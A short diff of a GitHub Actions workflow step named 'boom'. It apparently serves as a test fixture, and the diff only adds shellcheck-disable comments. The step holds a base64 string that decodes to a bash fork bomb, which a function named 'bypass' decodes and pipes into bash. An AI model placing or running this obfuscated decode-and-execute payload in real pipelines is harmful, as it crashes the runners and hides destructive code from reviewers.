@@ -21,11 +21,13 @@ jobs:
     steps:
       - name: 'boom'
         shell: 'bash'
+        # shellcheck disable=SC1072
         run: |
           PAYLOAD="OigpeyA6fDomIH07Ogo="
           echo ">>>>> before payload run"
           function bypass() {
             echo "$PAYLOAD" | base64 --decode | bash
           }
+          # shellcheck disable=SC1072
           bypass()
           echo "<<<<< after payload run"
